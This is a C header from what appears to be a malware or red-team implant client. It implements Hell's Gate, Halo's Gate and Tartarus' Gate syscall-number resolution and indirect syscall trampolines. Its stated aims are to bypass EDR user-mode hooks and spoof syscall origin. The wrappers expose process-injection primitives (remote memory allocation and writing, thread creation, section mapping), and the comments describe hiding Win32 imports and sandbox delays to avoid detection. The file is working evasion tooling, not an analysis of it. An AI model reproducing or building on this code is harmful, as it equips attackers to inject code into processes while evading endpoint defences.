/*
 * client/syscall.h  –  Hell's Gate + Halo's Gate + Tartarus' Gate
 * ================================================================
 * Extracts Windows syscall numbers (SSNs) from ntdll stubs at runtime and
 * issues them via an indirect `jmp` into the correct ntdll gadget, bypassing
 * the ntdll layer and any EDR hooks while spoofing the syscall origin RIP.
 *
 * Hell's Gate — unhooked `syscall` stub:
 *     [+0]  4C 8B D1        mov  r10, rcx
 *     [+3]  B8 XX XX XX XX  mov  eax, <SSN>   ← read 4 bytes here
 *     [+11] 0F 05           syscall
 *     [+13] C3              ret
 *   Gadget: 0F 05 C3  (syscall; ret) inside ntdll.
 *
 * Tartarus' Gate — `int 0x2e` stub (legacy or EDR-rerouted):
 *     [+0]  4C 8B D1        mov  r10, rcx
 *     [+3]  B8 XX XX XX XX  mov  eax, <SSN>   ← SSN still at +4
 *     [+8]  CD 2E           int  0x2e
 *     [+A]  C3              ret
 *   Gadget: CD 2E C3  (int 0x2e; ret) inside ntdll.
 *   Detection: bytes [+8..+9] == CD 2E after successful SSN read.
 *
 * mov-edx variant — BA opcode:
 *   Some EDRs replace B8 with BA (mov edx) at +3 as a hook marker; SSN is
 *   still at +4.  _read_ssn_direct accepts both B8 and BA.
 *
 * Halo's Gate — JMP-hooked stub (byte 0 == E9):
 *   Scan neighbouring stubs at ±stride until an unhooked one is found.
 *   SSN[target] = SSN[neighbour] ± delta.  Stride is measured at runtime.
 *   The gadget type (syscall vs int 0x2e) is inherited from the neighbour.
 *
 * Per-SSN gadget table:
 *   g_ssn_gadget[SC_ID] holds the gadget pointer for each resolved function
 *   so mixed environments (some stubs use `syscall`, others `int 0x2e`) are
 *   handled correctly without a single global assumption.
 *
 * Indirect syscall / call-stack spoofing:
 *   Trampolines jmp to the ntdll gadget — the CPU trap-frame's saved RIP
 *   falls inside ntdll, defeating EDR origin-RIP checks.
 *
 *   Note: kernel-mode callbacks (ETW-Ti, PsSetCreateThreadNotifyRoutine,
 *   ObRegisterCallbacks, minifilters) fire regardless of how the syscall is
 *   issued; no user-mode technique can prevent them.
 *
 * Usage:
 *   1. Call sc_init() once at startup (after unhook_ntdll if used).
 *   2. Use the SC_Nt* inline wrappers — they pass the SC_ID slot + SSN so
 *      the correct per-function gadget is automatically selected.
 */

#pragma once
#ifndef CLIENT_SYSCALL_H
#define CLIENT_SYSCALL_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Syscall slot IDs ───────────────────────────────────────────────────── */
typedef enum _SC_ID {
    SSN_NtAllocateVirtualMemory  = 0,
    SSN_NtWriteVirtualMemory     = 1,
    SSN_NtProtectVirtualMemory   = 2,
    SSN_NtCreateThreadEx         = 3,
    SSN_NtClose                  = 4,
    SSN_NtReadVirtualMemory      = 5,
    SSN_NtCreateSection          = 6,
    SSN_NtMapViewOfSection       = 7,
    SSN_NtUnmapViewOfSection     = 8,
    SSN_NtOpenFile               = 9,   /* IAT-free file open for unhook_ntdll */
    SSN_NtDelayExecution         = 10,  /* IAT-free sleep for sandbox_delay()  */
    SC_COUNT                     = 11
} SC_ID;

/* ── Public API ─────────────────────────────────────────────────────────── */

/*
 * sc_init
 * -------
 * Resolves syscall numbers for all SC_ID slots using Hell's Gate / Halo's Gate.
 * Must be called once at startup, after unhook_ntdll() so that restored stubs
 * are available for direct reading.
 *
 * Returns TRUE if every SSN was resolved, FALSE if any failed.
 */
BOOL sc_init(void);

/*
 * sc_get_ssn
 * ----------
 * Returns the resolved syscall number for `id`, or 0xFFFFFFFF if not resolved.
 */
DWORD sc_get_ssn(SC_ID id);

/*
 * sc_ready
 * --------
 * Returns TRUE if sc_init() completed successfully.
 */
BOOL sc_ready(void);

/*
 * sc_get_gadget
 * -------------
 * Returns the VA of the `syscall; ret` gadget inside ntdll that sc_init()
 * located, or NULL if sc_init() has not yet run or the gadget was not found.
 * Intended for diagnostics / testing only — the trampolines use it internally.
 */
const BYTE *sc_get_gadget(void);

/*
 * sc_get_int2e_gadget
 * -------------------
 * Returns the VA of the `int 0x2e; ret` gadget inside ntdll that sc_init()
 * located (Tartarus' Gate), or NULL if no int 0x2e stub was found.
 * Intended for diagnostics / testing only.
 */
const BYTE *sc_get_int2e_gadget(void);

/* ── Syscall trampolines (x64 only) ─────────────────────────────────────── */
/*
 * Each trampoline takes (slot, ssn, a1..aN):
 *   slot — SC_ID enum value; indexes g_ssn_gadget[] to select the correct
 *           ntdll gadget (syscall;ret or int 0x2e;ret) for this function.
 *   ssn  — the syscall number for this call.
 *   a1..aN — real syscall arguments.
 *
 * sc_syscall4  — 4 real syscall args
 * sc_syscall5  — 5 real syscall args
 * sc_syscall6  — 6 real syscall args
 * sc_syscall7  — 7 real syscall args  (NtCreateSection)
 * sc_syscall11 — 11 real syscall args (NtCreateThreadEx / NtMapViewOfSection)
 */
NTSTATUS sc_syscall4 (DWORD slot, DWORD ssn, ...);
NTSTATUS sc_syscall5 (DWORD slot, DWORD ssn, ...);
NTSTATUS sc_syscall6 (DWORD slot, DWORD ssn, ...);
NTSTATUS sc_syscall7 (DWORD slot, DWORD ssn, ...);
NTSTATUS sc_syscall11(DWORD slot, DWORD ssn, ...);

/* ── Convenience wrappers ───────────────────────────────────────────────── */
/*
 * These mirror the Nt* function signatures exactly and route through
 * the direct-syscall trampolines.  Drop-in replacements for the
 * GetProcAddress-resolved pointers in inject.c.
 */

static inline NTSTATUS
SC_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                            ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                            ULONG AllocationType, ULONG Protect)
{
    return sc_syscall6(SSN_NtAllocateVirtualMemory,
                       sc_get_ssn(SSN_NtAllocateVirtualMemory),
                       ProcessHandle, BaseAddress, ZeroBits,
                       RegionSize, AllocationType, Protect);
}

static inline NTSTATUS
SC_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                         PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                         PSIZE_T NumberOfBytesWritten)
{
    return sc_syscall5(SSN_NtWriteVirtualMemory,
                       sc_get_ssn(SSN_NtWriteVirtualMemory),
                       ProcessHandle, BaseAddress, Buffer,
                       NumberOfBytesToWrite, NumberOfBytesWritten);
}

static inline NTSTATUS
SC_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                        PVOID Buffer, SIZE_T NumberOfBytesToRead,
                        PSIZE_T NumberOfBytesRead)
{
    return sc_syscall5(SSN_NtReadVirtualMemory,
                       sc_get_ssn(SSN_NtReadVirtualMemory),
                       ProcessHandle, BaseAddress, Buffer,
                       NumberOfBytesToRead, NumberOfBytesRead);
}

static inline NTSTATUS
SC_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                           PSIZE_T NumberOfBytesToProtect,
                           ULONG NewAccessProtection, PULONG OldAccessProtection)
{
    return sc_syscall5(SSN_NtProtectVirtualMemory,
                       sc_get_ssn(SSN_NtProtectVirtualMemory),
                       ProcessHandle, BaseAddress, NumberOfBytesToProtect,
                       NewAccessProtection, OldAccessProtection);
}

static inline NTSTATUS
SC_NtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess,
                    PVOID ObjectAttributes, HANDLE ProcessHandle,
                    PVOID lpStartAddress, PVOID lpParameter,
                    ULONG Flags, SIZE_T StackZeroBits,
                    SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve,
                    PVOID lpBytesBuffer)
{
    return sc_syscall11(SSN_NtCreateThreadEx,
                        sc_get_ssn(SSN_NtCreateThreadEx),
                        hThread, DesiredAccess, ObjectAttributes,
                        ProcessHandle, lpStartAddress, lpParameter,
                        Flags, StackZeroBits, SizeOfStackCommit,
                        SizeOfStackReserve, lpBytesBuffer);
}

static inline NTSTATUS
SC_NtClose(HANDLE Handle)
{
    return sc_syscall4(SSN_NtClose, sc_get_ssn(SSN_NtClose),
                       Handle, 0, 0, 0);
}

static inline NTSTATUS
SC_NtCreateSection7(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
                    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
                    ULONG SectionPageProtection, ULONG AllocationAttributes,
                    HANDLE FileHandle)
{
    return sc_syscall7(SSN_NtCreateSection,
                       sc_get_ssn(SSN_NtCreateSection),
                       SectionHandle, (PVOID)(ULONG_PTR)DesiredAccess,
                       ObjectAttributes, MaximumSize,
                       (PVOID)(ULONG_PTR)SectionPageProtection,
                       (PVOID)(ULONG_PTR)AllocationAttributes,
                       FileHandle);
}

static inline NTSTATUS
SC_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle,
                      PVOID *BaseAddress, ULONG_PTR ZeroBits,
                      SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
                      PSIZE_T ViewSize, DWORD InheritDisposition,
                      ULONG AllocationType, ULONG Win32Protect)
{
    return sc_syscall11(SSN_NtMapViewOfSection,
                        sc_get_ssn(SSN_NtMapViewOfSection),
                        SectionHandle, ProcessHandle, BaseAddress,
                        (PVOID)(ULONG_PTR)ZeroBits,
                        (PVOID)(ULONG_PTR)CommitSize, SectionOffset, ViewSize,
                        (PVOID)(ULONG_PTR)InheritDisposition,
                        (PVOID)(ULONG_PTR)AllocationType,
                        (PVOID)(ULONG_PTR)Win32Protect,
                        NULL /* unused 11th arg */);
}

static inline NTSTATUS
SC_NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress)
{
    return sc_syscall4(SSN_NtUnmapViewOfSection,
                       sc_get_ssn(SSN_NtUnmapViewOfSection),
                       ProcessHandle, BaseAddress, 0, 0);
}

/*
 * SC_NtOpenFile
 * -------------
 * Opens an existing file object by NT object path.
 * Used by unhook_ntdll() to open ntdll on disk without calling CreateFileW,
 * removing that high-signal Win32 import from the observable call sequence.
 *
 * Parameters match NtOpenFile exactly:
 *   FileHandle      — out: handle to the opened file
 *   DesiredAccess   — FILE_READ_DATA | SYNCHRONIZE
 *   ObjectAttributes — NT path in a UNICODE_STRING, root dir = NULL
 *   IoStatusBlock   — out: receives final status + byte count
 *   ShareAccess     — FILE_SHARE_READ
 *   OpenOptions     — FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
 */
static inline NTSTATUS
SC_NtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
              PVOID ObjectAttributes, PVOID IoStatusBlock,
              ULONG ShareAccess, ULONG OpenOptions)
{
    return sc_syscall6(SSN_NtOpenFile,
                       sc_get_ssn(SSN_NtOpenFile),
                       FileHandle,
                       (PVOID)(ULONG_PTR)DesiredAccess,
                       ObjectAttributes,
                       IoStatusBlock,
                       (PVOID)(ULONG_PTR)ShareAccess,
                       (PVOID)(ULONG_PTR)OpenOptions);
}

/*
 * SC_NtDelayExecution
 * -------------------
 * Suspend the current thread for the specified interval.
 * Alertable = FALSE, DelayInterval is a negative LARGE_INTEGER
 * (100-nanosecond relative intervals).
 *
 * Replaces Win32 Sleep() — keeps Sleep out of the IAT.
 */
static inline NTSTATUS
SC_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
{
    return sc_syscall4(SSN_NtDelayExecution,
                       sc_get_ssn(SSN_NtDelayExecution),
                       (PVOID)(ULONG_PTR)Alertable,
                       DelayInterval,
                       NULL,
                       NULL);
}

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SYSCALL_H */
